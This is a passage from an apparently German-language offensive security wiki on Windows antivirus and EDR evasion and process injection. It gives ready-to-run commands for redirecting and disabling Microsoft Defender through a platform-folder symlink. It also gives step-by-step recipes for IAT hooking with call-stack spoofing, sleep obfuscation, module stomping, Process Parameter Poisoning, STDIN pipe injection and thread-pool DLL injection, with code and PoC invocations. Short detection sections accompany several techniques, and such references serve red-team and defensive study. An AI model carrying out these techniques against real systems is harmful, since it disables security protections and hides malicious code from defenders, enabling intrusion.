- Defender blockiert Schreibvorgänge in seinen eigenen Ordnern, aber die Plattformauswahl vertraut Verzeichniseinträgen und wählt die lexikografisch höchste Version aus, ohne zu prüfen, ob das Ziel auf einen geschützten/vertrauenswürdigen Pfad verweist.

Schritt für Schritt (Beispiel)
1) Erstelle einen beschreibbaren Klon des aktuellen Plattformordners, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstellen Sie innerhalb von Platform einen Verzeichnis-Symlink mit höherer Versionsnummer, der auf Ihren Ordner verweist:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfen, ob MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Du solltest den neuen Prozesspfad unter `C:\TMP\AV\` sowie die Dienstkonfiguration/Registry auf diesen Speicherort verweisen sehen.

Post-Exploitation-Optionen
- DLL Sideloading/Code-Ausführung: Lege DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, ab oder ersetze sie, um Code in den Prozessen von Defender auszuführen. Siehe den obigen Abschnitt: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Dienstbeendigung/Denial of Service: Entferne den Versions-Symlink, damit der konfigurierte Pfad beim nächsten Start nicht aufgelöst werden kann und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Beachte, dass diese Technik allein keine Privilegieneskalation ermöglicht; sie erfordert Admin-Rechte.

## API/IAT-Hooking + Call-Stack-Spoofing mit PIC (im Stil von Crystal Kit)

Red Teams können Runtime-Evasion aus dem C2-Implantat in das Zielmodul verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über angreiferkontrollierten, positionsunabhängigen Code (PIC) leiten. Dadurch lässt sich die Evasion über die kleine API-Oberfläche hinaus verallgemeinern, die viele Kits bereitstellen (z. B. CreateProcessA), und derselbe Schutz auf BOFs und Post-Exploitation-DLLs ausweiten.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Ansatz auf hoher Ebene
- Ein PIC-Blob wird mithilfe eines Reflective Loaders neben dem Zielmodul bereitgestellt (vorangestellt oder als Begleitdatei). Der PIC muss eigenständig und positionsunabhängig sein.
- Beim Laden der Host-DLL wird ihr IMAGE_IMPORT_DESCRIPTOR durchlaufen und werden die IAT-Einträge für ausgewählte Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) so gepatcht, dass sie auf schlanke PIC-Wrapper zeigen.
- Jeder PIC-Wrapper führt vor dem Tail-Call an die echte API-Adresse Evasion-Maßnahmen aus. Typische Maßnahmen sind:
  - Memory-Maskierung und -Demaskierung rund um den Aufruf (z. B. Beacon-Bereiche verschlüsseln, RWX→RX, Seitennamen/Berechtigungen ändern) und anschließendes Wiederherstellen.
  - Call-Stack-Spoofing: Einen unauffälligen Stack erstellen und zur Ziel-API wechseln, sodass die Call-Stack-Analyse die erwarteten Frames auflöst.<sup>[[9]](#references)</sup>
- Zur Kompatibilität wird eine Schnittstelle exportiert, über die ein Aggressor-Skript (oder ein Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und Post-Ex-DLLs gehookt werden sollen.

Warum hier IAT-Hooking?
- Funktioniert mit jedem Code, der den gehookten Import verwendet, ohne den Tool-Code zu ändern oder sich darauf zu verlassen, dass Beacon bestimmte APIs proxyt.
- Deckt Post-Ex-DLLs ab: Durch das Hooken von LoadLibrary* lassen sich Modulladevorgänge (z. B. System.Management.Automation.dll, clr.dll) abfangen und dieselbe Maskierung sowie Call-Stack-Evasion auf deren API-Aufrufe anwenden.
- Ermöglicht die zuverlässige Verwendung von Post-Ex-Befehlen zum Starten von Prozessen gegen Call-Stack-basierte Erkennungen, indem CreateProcessA/W gewrappt wird.

Minimales IAT-Hook-Schema (x64-C/C++-Pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notizen
- Wende den Patch nach Relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective Loader wie TitanLdr/AceLdr zeigen Hooking während DllMain des geladenen Moduls.
- Halte Wrapper klein und PIC-sicher; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patchen gespeichert hast, oder über LdrGetProcedureAddress.
- Verwende für PIC RW → RX-Übergänge und vermeide Seiten, die gleichzeitig beschreibbar und ausführbar sind.

Call-Stack-Spoofing-Stub
- PIC-Stubs im Stil von Draugr erstellen eine gefälschte Call-Chain (mit Return-Adressen in benignen Modulen) und springen dann in die echte API.
- Damit lassen sich Erkennungen umgehen, die bei sensiblen APIs kanonische Stacks von Beacon/BOFs erwarten.
- Kombiniere dies mit Stack-Cutting-/Stack-Stitching-Techniken, um vor dem API-Prolog in erwarteten Frames zu landen.

Operative Integration
- Stelle den Reflective Loader den Post-Ex-DLLs voran, damit PIC und Hooks beim Laden der DLL automatisch initialisiert werden.
- Verwende ein Aggressor-Script, um Ziel-APIs zu registrieren, damit Beacon und BOFs transparent denselben Evasion-Pfad nutzen, ohne dass Codeänderungen nötig sind.

Überlegungen zu Detection/DFIR
- IAT-Integrität: Einträge, die auf Nicht-Image-Adressen (Heap/anon) aufgelöst werden; regelmäßige Prüfung von Import-Pointern.
- Stack-Anomalien: Return-Adressen, die zu keinem geladenen Image gehören; abrupte Übergänge zu Nicht-Image-PIC; inkonsistente RtlUserThreadStart-Abstammung.
- Loader-Telemetrie: Schreibvorgänge im Prozess auf die IAT, frühe DllMain-Aktivität, die Import-Thunks verändert, unerwartete RX-Bereiche, die beim Laden erstellt werden.
- Image-Load-Evasion: Wenn LoadLibrary* gehookt wird, verdächtige Ladevorgänge von Automatisierungs-/CLR-Assemblies überwachen, die mit Memory-Masking-Ereignissen korrelieren.

Verwandte Bausteine und Beispiele
- Reflective Loader, die beim Laden IAT-Patching durchführen (z. B. TitanLdr, AceLdr)
- Memory-Masking-Hooks (z. B. simplehook) und Stack-Cutting-PIC (stackcutting)
- PIC-Call-Stack-Spoofing-Stubs (z. B. Draugr)


## IAT-Hooking zur Importzeit + Sleep-Obfuscation (Crystal Palace/PICO)

### IAT-Hooks zur Importzeit über ein resident PICO

Wenn du einen Reflective Loader kontrollierst, kannst du Imports **während** `ProcessImports()` hooken, indem du den `GetProcAddress`-Pointer des Loaders durch einen benutzerdefinierten Resolver ersetzt, der zuerst nach Hooks sucht:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Erstelle ein **resident PICO** (persistentes PIC-Objekt), das bestehen bleibt, nachdem sich der temporäre Loader-PIC selbst freigegeben hat.
- Exportiere eine Funktion `setup_hooks()`, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- Überspringe in `_GetProcAddress` Imports per Ordinal und verwende eine Hash-basierte Hook-Suche wie `__resolve_hook(ror13hash(name))`. Gibt es einen Hook, gib ihn zurück; andernfalls leite den Aufruf an den echten `GetProcAddress` weiter.
- Registriere Hook-Ziele zur Link-Zeit mit Crystal-Palace-Einträgen der Form `addhook "MODULE$Func" "hook"`. Der Hook bleibt gültig, weil er sich im resident PICO befindet.

So erhältst du eine **IAT-Umleitung zur Importzeit**, ohne nach dem Laden den Code-Abschnitt der geladenen DLL zu patchen.

### Erzwingen hookbarer Imports, wenn das Ziel PEB-Walking verwendet

Hooks zur Importzeit werden nur ausgelöst, wenn sich die Funktion tatsächlich in der IAT des Ziels befindet. Wenn ein Modul APIs per PEB-Walk + Hash auflöst (ohne Import-Eintrag), erzwinge einen echten Import, damit der `ProcessImports()`-Pfad des Loaders ihn erfasst:

- Ersetze die Auflösung gehashter Exports (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, der das Abfangen ermöglicht, wenn der Reflective Loader Imports auflöst.

### Ekko-artige Sleep-/Idle-Obfuscation ohne Patching von `Sleep()`

Anstatt `Sleep` zu patchen, hooke die **tatsächlich vom Implantat verwendeten Wait-/IPC-Primitiven** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Bei langen Wartezeiten kapselst du den Aufruf in eine Ekko-artige Obfuscation-Chain, die das In-Memory-Image während der Inaktivität verschlüsselt:<sup>[[31]](#references)[[27]](#references)</sup>

- Verwende `CreateTimerQueueTimer`, um eine Folge von Callbacks zu planen, die `NtContinue` mit vorbereiteten `CONTEXT`-Frames aufrufen.
- Typische Chain (x64): Image auf `PAGE_READWRITE` setzen → per RC4 über das gesamte gemappte Image mit `advapi32!SystemFunction032` verschlüsseln → den blockierenden Wait ausführen → per RC4 entschlüsseln → **Berechtigungen pro Abschnitt wiederherstellen**, indem die PE-Abschnitte durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert eine `CONTEXT`-Vorlage; klone sie in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt aufzurufen.

Operatives Detail: Gib bei langen Wartezeiten (z. B. `WAIT_OBJECT_0`) „success“ zurück, damit der Aufrufer fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während Inaktivitätsfenstern vor Scannern und vermeidet die klassische Signatur eines „gepatchten `Sleep()`“.

Detection-Ideen (telemetriebasiert)
- Bursts von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` zeigen.
- Verwendung von `advapi32!SystemFunction032` auf großen, zusammenhängenden Puffern in Image-Größe.
- `VirtualProtect` für große Bereiche, gefolgt von der Wiederherstellung benutzerdefinierter Berechtigungen pro Abschnitt.

### Laufzeit-CFG-Registrierung für Sleep-Obfuscation-Gadgets

Auf CFG-aktivierten Zielen stürzt der erste indirekte Sprung in ein Mid-Function-Gadget wie `jmp [rbx]` oder `jmp rdi` üblicherweise mit `STATUS_STACK_BUFFER_OVERRUN` ab, weil das Gadget nicht in den CFG-Metadaten des Moduls enthalten ist. Damit Ekko-/Kraken-artige Chains in gehärteten Prozessen funktionieren:<sup>[[30]](#references)</sup>

- Registriere jedes von der Chain verwendete indirekte Sprungziel mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Bei Adressen in geladenen Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` an der **Image-Basis** beginnen und die **gesamte Image-Größe** abdecken.
- Verwende bei manuell gemappten/PIC-/gestompten Bereichen stattdessen die **Allokationsbasis** und die Allokationsgröße.
- Markiere nicht nur das Dispatch-Gadget, sondern auch indirekt erreichte Exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait-/Event-Systemaufrufe) sowie alle ausführbaren, vom Angreifer kontrollierten Abschnitte, die zu indirekten Zielen werden.

Damit werden Sleep-Chains im ROP-/JOP-Stil von „funktioniert nur in Prozessen ohne CFG“ zu einem wiederverwendbaren Primitiv für `explorer.exe`, Browser, `svchost.exe` und andere mit `/guard:cf` kompilierte Endpunkte.

### CET-sicheres Stack-Spoofing für schlafende Threads

Ein vollständiger Austausch von `CONTEXT` ist auffällig und kann auf CET-Shadow-Stack-Systemen Probleme verursachen, weil ein gefälschtes `Rip` weiterhin mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Sleep-Masking-Muster ist:<sup>[[30]](#references)</sup>

- Wähle einen anderen Thread im selben Prozess und lies über `NtQueryInformationThread` dessen `NT_TIB`-/TEB-Stack-Grenzen (`StackBase`, `StackLimit`) aus.
- Sichere den echten TEB/TIB des aktuellen Threads.
- Erfasse mit `GetThreadContext` den echten Kontext des schlafenden Threads.
- Kopiere **nur** das echte `Rip` in den Spoof-Kontext und lasse den gefälschten `Rsp`-/Stack-Zustand unverändert.
- Kopiere während des Sleep-Fensters den `NT_TIB` des Spoof-Threads in den aktuellen TEB, sodass Stack-Walker innerhalb eines legitimen Stack-Bereichs zurückverfolgen.
- Stelle nach dem Wait den ursprünglichen TIB und Thread-Kontext wieder her.

So bleibt der Instruction Pointer CET-konsistent, während EDR-Stack-Walker getäuscht werden, die TEB-Stack-Metadaten zur Validierung des Unwindings heranziehen.

### APC-basierte Alternative: Kraken Mask

Wenn die Timer-Queue-Dispatch-Signatur zu auffällig ist, lässt sich dieselbe Sleep-Encrypt-Spoof-Restore-Sequenz über einen angehaltenen Hilfsthread mit eingereihten APCs ausführen:<sup>[[27]](#references)</sup>

- Erstelle einen Hilfsthread mit `NtTestAlert` als Entry-Point.
- Reihel vorbereitete `CONTEXT`-Frames/APCs mit `NtQueueApcThread` ein und arbeite sie mit `NtAlertResumeThread` ab.
- Speichere den Zustand der Chain auf dem Heap statt auf dem Stack des Hilfsthreads, damit der standardmäßige 64-KB-Thread-Stack nicht erschöpft wird.
- Verwende `NtSignalAndWaitForSingleObject`, um atomar das Start-Event zu signalisieren und zu blockieren.
- Halte den Hauptthread an, bevor du TIB/Kontext wiederherstellst (`NtSuspendThread` → Wiederherstellung → `NtResumeThread`), um das Race Window zu verkleinern, in dem ein Scanner einen teilweise wiederhergestellten Stack erfassen könnte.

Damit wird die Signatur `CreateTimerQueueTimer` + `NtContinue` durch eine Hilfsthread-/APC-Signatur ersetzt, während dieselben Ziele für RC4-Masking und Stack-Spoofing erhalten bleiben.

Zusätzliche Detection-Ideen
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleeps, Waits oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext` in Verbindung mit `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe`.
- `NtQueryInformationThread`, gefolgt von direkten Schreibvorgängen in die TEB/TIB-Stack-Grenzen des aktuellen Threads.
- `NtQueueApcThread`-/`NtAlertResumeThread`-Chains, die indirekt `SystemFunction032`, `VirtualProtect` oder Hilfsfunktionen zur Wiederherstellung von Abschnittsberechtigungen erreichen.
- Wiederholte Verwendung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots in signierten Modulen.


## Präzises Module Stomping

Module Stomping führt Payloads aus dem **`.text`-Abschnitt einer DLL aus, die bereits im Zielprozess gemappt ist**, statt offensichtlich privaten ausführbaren Speicher zu allokieren oder eine neue sacrificial DLL zu laden. Das Überschreibungsziel sollte ein **geladenes, dateigestütztes Image** sein, dessen Code-Bereich die Payload aufnehmen kann, ohne Codepfade zu beschädigen, die der Prozess noch benötigt.<sup>[[1]](#references)[[2]](#references)</sup>

### Zuverlässige Auswahl des Ziels

Naives Stomping gegen gängige Module wie `uxtheme.dll` oder `comctl32.dll` ist fragil: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Code-Bereich lässt den Prozess abstürzen. Ein zuverlässigerer Ablauf:

1. Zähle die Module des Zielprozesses auf und erstelle eine **Include-Liste nur mit den Namen** bereits geladener DLLs.
2. Erstelle zuerst die Payload und erfasse ihre **exakte Byte-Größe**.
3. Durchsuche DLLs auf dem Datenträger und vergleiche `Misc_VirtualSize` des PE-Abschnitts **`.text`** mit der Payload-Größe. Das ist wichtiger als die Dateigröße, weil dieser Wert die Größe des ausführbaren Abschnitts **beim Mapping in den Speicher** angibt.
4. Parse die **Export Address Table (EAT)** und wähle eine exportierte Funktions-RVA als Start-Offset für das Stomping.
5. Berechne den **Auswirkungsbereich**: Wenn die Payload die Grenze der ausgewählten Funktion überschreitet, überschreibt sie angrenzende Exports, die im Speicher dahinter angeordnet sind.

Typische Recon-/Auswahl-Hilfsprogramme aus der Praxis:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Betriebshinweise
- Bevorzuge DLLs, die im Remote-Prozess **bereits geladen** sind, um die Telemetrie von `LoadLibrary`/unerwarteten Image-Ladevorgängen zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung selten ausgeführt werden. Andernfalls können normale Codepfade die überschriebenen Bytes vor oder nach der Thread-Erstellung erreichen.
- Bei großen Implants muss das Einbetten des Shellcodes oft von einem Stringliteral auf einen **Byte-Array-/Klammer-Initializer** umgestellt werden, damit der vollständige Buffer im Injector-Quellcode korrekt dargestellt wird.

Erkennungsideen
- Remote-Schreibvorgänge in **ausführbare, imagegestützte Speicherseiten** (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt in die häufigeren privaten RWX/RX-Allokationen.
- Export-Einstiegspunkte, deren Bytes im Speicher nicht mehr mit der zugrunde liegenden Datei auf dem Datenträger übereinstimmen.
- Remote-Threads oder Context-Pivots, deren Ausführung innerhalb eines legitimen DLL-Exports beginnt, dessen erste Bytes kürzlich geändert wurden.
- Verdächtige Sequenzen aus `VirtualProtect(Ex)` / `WriteProcessMemory` für DLL-`.text`-Seiten, auf die eine Thread-Erstellung folgt.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ist eine **Process-Injection-/EDR-Evasion-Technik**, die den klassischen Remote-Schreibpfad (`VirtualAllocEx` + `WriteProcessMemory`) umgeht. Statt Bytes in ein bereits laufendes Ziel zu kopieren, nutzt sie aus, dass Windows **ausgewählte Startparameter von `CreateProcessW` in den Kindprozess kopiert** und sie in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) speichert.<sup>[[28]](#references)[[29]](#references)</sup>

### Durch `CreateProcessW` kopierte vergiftbare Träger

Nützliche Träger sind:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (mit `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktische Einschränkungen der Träger:

- `lpCommandLine` muss für `CreateProcessW` auf **beschreibbaren Speicher** zeigen und ist auf **32.767 Unicode-Zeichen** einschließlich Nullterminator begrenzt.
- `lpEnvironment` muss ein Unicode-Umgebungsblock aus aufeinanderfolgenden `NAME=VALUE\0`-Strings sein, der mit einem zusätzlichen `\0` terminiert wird.
- `lpReserved` ist offiziell reserviert. Daher sollte die Zuordnung zu `ShellInfo` als Implementierungsdetail und nicht als stabiler, dokumentierter Vertrag betrachtet werden.

Dadurch wird die normale Prozesserstellung zum **Payload-Transfer-Primitive**. Der Operator erstellt den Kindprozess mit angreiferkontrollierten Startdaten und überlässt Windows das prozessübergreifende Kopieren.

### Remote-Lookup-Ablauf ohne Remote-Schreib-APIs

Nach der Erstellung des Kindprozesses wird der kopierte Buffer mit **schreibgeschützten** Primitives aufgelöst:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` abrufen
2. Den Remote-`PEB` lesen
3. `PEB.ProcessParameters` folgen
4. `RTL_USER_PROCESS_PARAMETERS` lesen
5. Den ausgewählten Zeiger verwenden:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimaler Ablauf:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Ausführen des kopierten Parameterpuffers

Der kopierte Parameterbereich ist normalerweise `RW`, nicht ausführbar. Eine gängige P3-Kette sieht so aus:

1. Den Prozess normal erstellen (nicht angehalten)
2. Die ausgewählte Parameterseite mit `NtProtectVirtualMemory` / `VirtualProtectEx` ausführbar machen
3. Den bereits in `PROCESS_INFORMATION` zurückgegebenen Handle des Hauptthreads wiederverwenden
4. Die Ausführung mit `NtSetContextThread` umleiten (`CONTEXT_CONTROL`, `RIP` überschreiben)

Im Gegensatz zu klassischen Thread-Hijacking-Workflows sind dafür **weder** `SuspendThread` **noch** `ResumeThread` erforderlich; der Kontext kann direkt über den zurückgegebenen Handle des Hauptthreads geändert werden.

Dadurch werden mehrere APIs vermieden, die häufig auf Injection überwacht werden:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- oft auch `SuspendThread` / `ResumeThread`

### Null-Byte-Beschränkung und gestaffelter Shellcode

Alle drei Träger sind **Strings oder stringartige Daten**, daher wird eine rohe Payload mit `0x00` während der Übertragung abgeschnitten. Eine praktische Umgehung ist eine **null-byte-freie erste Stufe**, die Konstanten zur Laufzeit rekonstruiert und dann eine beliebige zweite Stufe lädt.

Ein einfaches Muster ist die XOR-basierte Synthese von Konstanten:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Damit kann die erste Stufe Stack-Strings, API-Argumente, DLL-Pfade oder einen Shellcode-Loader der zweiten Stufe erstellen, ohne Nullbytes in den übertragenen Parameter einzubetten.

### Stack-basierte API-Aufrufe aus der ersten Stufe

Wenn die erste Stufe APIs wie `LoadLibraryA` aufrufen muss, kann sie:

- den String/Puffer auf den Stack des Zielprozesses pushen
- den **32-Byte-x64-Shadow-Space** reservieren
- `RCX`, `RDX`, `R8`, `R9` auf Konstanten oder `RSP`-relative Zeiger setzen
- `RSP` vor dem Aufruf **16-Byte-ausgerichtet** halten

Eine zweite Stufe kann dann vom Stack in eine `PAGE_READWRITE`-Speicherzuweisung kopiert, mit `VirtualProtect` auf `PAGE_EXECUTE_READ` umgestellt und angesprungen werden. So wird eine direkte RWX-Speicherzuweisung vermieden.

### Erkennungsideen

Gute Ansatzpunkte für die Suche, die von den Autoren genannt werden:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, die **Prozessparameterseiten ausführbar** machen
- auf diese Schutzänderung folgendes `SetThreadContext` / `NtSetContextThread`
- Remote-Lesezugriffe auf `PEB` und anschließend `RTL_USER_PROCESS_PARAMETERS`
- ungewöhnlich lange oder entropiereiche Werte für `lpCommandLine`, `lpEnvironment` oder `STARTUPINFO.lpReserved` während der Prozesserstellung

### Hinweise

- P3 ist ein **prozessübergreifender Übertragungstrick**, für sich genommen aber keine vollständige Ausführungsprimitive: Für den kopierten Parameter sind weiterhin eine Änderung der Ausführungsberechtigung und eine Methode zur Umleitung der Ausführung erforderlich.
- `RtlCreateProcessReflection` / Dirty Vanity wurde von den Autoren erwogen, aber verworfen, weil es intern auf verdächtige Primitive wie `NtWriteVirtualMemory` und `NtCreateThreadEx` zurückgreift.

Für die Payload-Übertragung in einen **bereits laufenden** Windows-Prozess über Thread-Beschreibungen mit anschließender Hijacking-Methode, bei der die Rücksprungadresse eines wartenden Threads manipuliert wird, siehe [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Console STDIN pipe injection

Ein interaktiver Konsolen-Kindprozess kann ebenfalls als **Primitive zur Payload-Übertragung** dienen. Der Injector leitet die Standardeingabe des Kindes zu einer Pipe um und sendet einen Marker gefolgt von Shellcode. Nachdem das Konsolenprogramm die Daten in seinen eigenen privaten Speicher eingelesen hat, findet der Injector diesen Puffer, macht ihn ausführbar und leitet einen Thread des Kindes dorthin um. Dadurch werden `VirtualAllocEx` und `WriteProcessMemory` vermieden; es handelt sich jedoch weiterhin um Process Injection und nicht um einen allgemeinen EDR-Bypass.<sup>[[41]](#references)</sup>

Trotz der Beschreibung als „named pipe“ ruft die Referenzimplementierung `CreatePipe` auf, wodurch eine **anonyme Pipe** erstellt wird. Windows implementiert anonyme Pipes intern mithilfe eindeutig benannter Pipe-Objekte, aber der PoC wählt weder einen `\\.\pipe\<name>`-Pfad aus noch ruft er `CreateNamedPipe` auf. Er erstellt vererbbare Handles mit einem standardmäßigen Sicherheitsdeskriptor, legt das Lese-Handle in `STARTUPINFO.hStdInput` ab, setzt `STARTF_USESTDHANDLES` und startet einen neuen Kindprozess mit aktivierter Handle-Vererbung. Daher startet dieser PoC die angegebene Konsolenanwendung; er verbindet seine Pipe nicht mit einem bestehenden Prozess.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referenzablauf

Die Implementierung verwendet folgende Abfolge:<sup>[[41]](#references)</sup>

1. Anonyme Pipe-Paare für `STDIN` und `STDOUT` des Kindes erstellen. Die Vererbung für die beiden Handles auf Elternseite deaktivieren und nach der Prozesserstellung die Duplikate auf Kindseite im Elternprozess schließen.
2. Eine interaktive ausführbare Datei wie `netsh.exe` oder `nslookup.exe` mit `CREATE_NEW_CONSOLE` starten. Das Kind erbt die umgeleiteten Standardhandles.
3. Das vollständige binäre Array `rawData` mit `WriteFile` über das `STDIN`-Handle auf Elternseite senden. Das Konsolenprogramm verarbeitet die Bytes und hinterlässt eine Kopie in einem seiner privaten, zugewiesenen Speicherbereiche.
4. Den Adressraum des Kindes mit `VirtualQueryEx` durchlaufen, mögliche `MEM_PRIVATE`-Bereiche mit `ReadProcessMemory` lesen und am Anfang von `rawData` nach dem Marker suchen.
5. Den gefundenen Puffer mit `VirtualProtectEx` auf `PAGE_EXECUTE_READWRITE` setzen.
6. Den Hauptthread identifizieren, anhalten, `RIP` mit `NtSetContextThread` auf `found_address + 0x19` setzen und den Thread fortsetzen.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die bereitgestellte Implementierung ist x64-spezifisch: Sie ändert `CONTEXT.Rip`, und ihr eingebetteter Payload ist x64-Shellcode. `rawData` beginnt mit einem 25 Byte langen Marker, daher beginnen die ausführbaren Bytes am hexadezimalen Offset `0x19`. Wenn du den Payload ersetzt, musst du dieses Layout beibehalten oder Marker, Suchvektor, Array-Größe und Ausführungs-Offset gemeinsam aktualisieren. Die Quellcodekommentare führen außerdem `0x0A`, `0x0D` und `0x1A` als bad characters auf. Dieser Workflow ändert weder das Token noch die Privilegien des Child-Prozesses.<sup>[[41]](#references)</sup>

Kleine native Hilfsprogramme und Muster für die Payload-Kompilierung findest du unter [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Thread-Pool-Callback-DLL-Injection ohne Shellcode (DLLParty)

DLLParty passt die Thread-Pool-Injection nach PoolParty-Art so an, dass ein bestehender Worker des Ziels `LoadLibraryA` aufruft, anstatt einen injizierten Callback-Stub auszuführen. Als Dispatch-Primitive dient ein `TP_DIRECT`-Completion, das an den I/O-Completion-Port des Zielpools gesendet wird. Dadurch werden Prozessberechtigungen nicht umgangen: Der PoC ruft `OpenProcess(PROCESS_ALL_ACCESS)` auf und benötigt lesbaren/schreibbaren Speicher des Ziels sowie duplizierbare Worker-Factory- und Completion-Port-Handles.<sup>[[46]](#references)[[47]](#references)</sup>

Unter Windows x64 übergibt der Worker einen Zeiger auf eine stackbasierte `TP_CALLBACK_INSTANCE` in `RCX`, das erste Callback-Argument. `LoadLibraryA` interpretiert denselben Zeiger als `LPCSTR`. Im getesteten Ablauf erstellt `TppWorkerThread` den Zeiger bei `RSP+0x178`, während der erste gewöhnliche Schreibzugriff auf dieses Objekt bei `RSP+0x1d0` erfolgt. Ein nullterminierter DLL-Pfad, der in dieses 0x58-Byte-Präfix passt, kann daher am Anfang der Instanz liegen, ohne vor dem Dispatch überschrieben zu werden. Dies ist eine buildspezifische Beobachtung und keine dokumentierte Windows-ABI-Garantie.<sup>[[46]](#references)[[47]](#references)</sup>

Der Referenz-Workflow lautet:<sup>[[46]](#references)[[47]](#references)</sup>

1. Ermittle die Handles des Ziels mit `NtQuerySystemInformation(SystemHandleInformation)` und identifiziere `TpWorkerFactory` durch Abfragen der Objekttypen. Dupliziere ein Worker-Factory-Handle und frage `WorkerFactoryBasicInformation` ab; `StartParameter` liefert den Remote-`TP_POOL`. Überspringe Factories mit `TotalWorkerCount == 0`.
2. Lies `TP_POOL.CompletionPort` aus und durchlaufe die private Worker-Liste des Pools. Im getesteten Windows-10-19045-x64-Build (`ntdll.dll 10.0.19041.4842`) liegt ihr Kopf bei `pool+0x60`; jeder Link liegt bei `worker+0x10`, sodass der Slot der Callback-Instanz bei `worker+0x38` gleich `link+0x28` ist. Der PoC prüft Zeigerausrichtung, Link-Gegenseitigkeit, Pool-Zugehörigkeit, Thread-IDs ungleich null, wiederholte Knoten und einen stabilen Listen-Kopf.
3. Schreibe den DLL-Pfad in **jeden** ermittelten Worker-Slot, da das gesendete Completion von einem beliebigen Worker verarbeitet werden kann. Platziere ein `TP_DIRECT` mit `Callback = LoadLibraryA` in beschreibbarem Speicher des Ziels. Statt `VirtualAllocEx` verwendet der PoC `last_slot-0x500` auf einem Worker-Stack; dieser Offset ist experimentell und darf nicht mit aktiven Stack-Daten kollidieren.
